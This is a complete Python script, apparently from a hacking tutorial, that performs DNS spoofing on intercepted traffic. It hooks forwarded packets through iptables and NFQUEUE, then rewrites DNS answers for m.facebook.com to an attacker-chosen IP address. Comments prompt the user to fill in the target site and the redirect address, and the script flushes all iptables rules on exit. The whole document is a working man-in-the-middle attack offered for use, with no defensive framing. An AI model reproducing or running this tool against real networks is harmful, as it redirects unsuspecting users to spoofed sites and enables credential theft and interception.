import netfilterqueue
import subprocess
import scapy.all as scapy
import time

subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '0'])

def processPacket(packet):
    scapyPacket = scapy.IP(packet.get_payload())
    if scapyPacket.haslayer(scapy.DNSRR):
        qname = scapyPacket[scapy.DNSQR].qname
        website = b'm.facebook.com'  #Enter name of target site

        if website in qname:
            print("[+] Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata='104.244.42.65')   #Enter IP of site on which you want your site to get redirected
            scapyPacket[scapy.DNS].an = answer
            scapyPacket[scapy.DNS].ancount = 1
            del scapyPacket[scapy.IP].len
            del scapyPacket[scapy.IP].chksum
            del scapyPacket[scapy.UDP].len
            del scapyPacket[scapy.UDP].chksum

            packet.set_payload(bytes(scapyPacket))

    packet.accept()



try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, processPacket)
    queue.run()
except KeyboardInterrupt:
    subprocess.call(['iptables', '--flush'])
    print("Flushing IP tables.....")
    time.sleep(1)

